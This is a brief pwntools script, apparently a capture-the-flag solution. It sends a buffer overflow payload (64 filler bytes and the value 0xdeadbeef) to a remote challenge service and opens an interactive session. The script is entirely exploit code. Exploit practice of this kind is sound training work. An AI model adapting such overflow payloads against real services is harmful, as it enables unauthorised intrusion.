from pwn import *


context.binary = elf =ELF('./chall')


p =remote('bof0.hackini24.shellmates.club',443)

#p =process()

payload=b'a'*64
payload+=p32(0xdeadbeef)

p.recv()


write('paylaod',payload)

p.sendline(payload)


p.interactive()

